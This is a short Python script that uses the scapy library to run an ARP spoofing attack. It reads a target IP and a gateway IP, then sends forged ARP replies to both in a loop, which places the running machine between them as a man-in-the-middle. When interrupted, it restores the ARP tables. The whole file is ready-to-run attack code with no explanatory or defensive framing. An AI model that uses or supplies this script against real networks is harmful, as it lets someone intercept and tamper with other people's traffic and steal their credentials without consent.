#!/usr/bin/env python
import sys
import time
import scapy.all as scapy
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list= scapy.srp(arp_request_broadcast,timeout=1,verbose=False)[0]
    return answered_list[0][1].hwsrc

def restore(destination_ip,source_ip):
    destination_mac=get_mac(destination_ip)
    source_mac=get_mac(source_ip)
    packet=scapy.ARP(op=2,pdst=destination_ip,hwdst=destination_mac,psrc=source_ip,hwsrc=source_mac)
    scapy.send(packet,verbose=False,count=4)

def spoof(target_ip,spoof_ip):
    target_mac=get_mac(target_ip)
    packet=scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=spoof_ip)
    scapy.send(packet,verbose=False)

target_ip=input()
gateway_ip=input()
try:
    sent_packets_count = 0
    while True:
        spoof(target_ip,gateway_ip)
        spoof(gateway_ip,target_ip)
        print("\r[+] Packet sent: "+str(sent_packets_count)),
        sys.stdout.flush()
        sent_packets_count+=2
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detecting CTRL  +   C ...........Resetting ARP tables ...... Please wait")
    restore(target_ip, gateway_ip)
    restore(gateway_ip,target_ip)



